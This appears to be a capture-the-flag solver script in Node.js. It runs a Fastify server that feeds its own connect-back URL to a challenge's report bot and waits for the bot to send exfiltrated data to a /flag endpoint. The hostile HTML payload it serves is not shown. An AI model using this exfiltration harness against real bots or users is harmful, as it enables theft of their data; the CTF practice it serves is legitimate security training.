import fastify from "fastify";
import assert from "node:assert/strict";
import fs from "node:fs";

const BOT_BASE_URL = process.env.BOT_BASE_URL ?? "http://localhost:1337";
const CONNECTBACK_URL = process.env.CONNECTBACK_URL ?? assert.fail("No URL");
const PORT = "8080";

const app = fastify();

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const report = (url) =>
  fetch(`${BOT_BASE_URL}/api/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ url }),
  }).then((r) => r.text());

app.get("/", async (req, reply) => {
  return reply
    .type("text/html; charset=utf-8")
    .send(fs.readFileSync("index.html"));
});

app.get("/flag", async (req, reply) => {
  // You got a flag!
  console.log({ ...req.query });
  process.exit(0);
});

app.post("/debug", async (req, reply) => {
  console.log("[debug] " + req.body);
  return "";
});

app.listen({ port: PORT, host: "0.0.0.0" }, async (err) => {
  if (err) assert.fail(err.toString());

  await sleep(3_000);
  await report(CONNECTBACK_URL);

  await sleep(3_000);
  assert.fail("Failed");
});
